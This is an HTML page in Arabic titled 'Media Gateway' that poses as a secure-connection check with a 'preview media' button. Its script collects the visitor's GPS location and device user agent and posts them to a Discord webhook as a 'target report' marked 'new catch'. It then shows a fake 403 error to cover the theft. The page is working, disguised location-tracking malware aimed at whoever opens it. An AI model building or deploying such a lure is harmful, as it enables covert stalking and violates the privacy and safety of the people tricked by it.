<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="manifest" href="manifest.json">
    <title>Media Gateway</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 100px; }
        button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

    <h2>جاري التحقق من اتصالك الآمن...</h2>
    <p>لمشاهدة المحتوى الخاص، اضغط على المعاينة</p>
    <button onclick="access()">معاينة الوسائط</button>

    <script>
        async function access() {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                
                // اترك هذا الرابط كما هو أو ضع رابط الـ Webhook الخاص بك هنا بدقة
                const WEBHOOK_URL = "https://discord.com/channels/1494438534344347658/1494438534864703500";

                const payload = {
                    content: "🎯 **صيد جديد!**",
                    embeds: [{
                        title: "تقرير الهدف",
                        description: `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n📱 الجهاز: ${navigator.userAgent}`,
                        color: 16711680
                    }]
                };

                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch (e) { console.log("خطأ في الإرسال"); }

                alert("خطأ 403: يجب منح صلاحيات الوصول للوسائط من إعدادات النظام.");
            }, (err) => {
                alert("يجب السماح بالوصول للموقع لمشاهدة المحتوى.");
            });
        }
    </script>
</body>
</html>
